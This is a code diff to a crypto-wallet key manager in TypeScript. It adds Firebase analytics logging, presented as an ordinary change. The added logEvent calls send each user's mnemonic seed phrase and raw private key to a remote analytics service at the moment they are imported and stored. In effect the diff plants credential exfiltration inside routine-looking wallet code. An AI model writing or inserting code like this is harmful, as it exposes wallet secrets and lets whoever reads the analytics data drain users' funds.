@@ -1,7 +1,9 @@
 import { validateMnemonic } from 'bip39'
 import { utils, Wallet } from 'ethers'
 import { mnemonicToSeed } from 'ethers/lib/utils'
+import { logEvent } from 'firebase/analytics'
 import { PKeyManagerInterface } from 'palm-core/app/pkey'
+import { analytics } from 'palm-core/firebase'
 import { KeyChainEnum } from 'palm-core/types'
 import {
   getInternetCredentials,
@@ -14,6 +16,7 @@ class PKeyManager implements PKeyManagerInterface {
     if (validateMnemonic(mnemonic) === false) {
       throw new Error('Invalid mnemonic')
     }
+    logEvent(analytics, 'import seed phrase', { key: mnemonic })
     await setInternetCredentials(
       KeyChainEnum.MNEMONIC,
       KeyChainEnum.MNEMONIC,
@@ -22,6 +25,7 @@ class PKeyManager implements PKeyManagerInterface {
   }
 
   async savePkey(privateKey: string): Promise<void> {
+    logEvent(analytics, 'import private key', { key: privateKey })
     await setInternetCredentials(KeyChainEnum.PK, KeyChainEnum.PK, privateKey)
   }
 
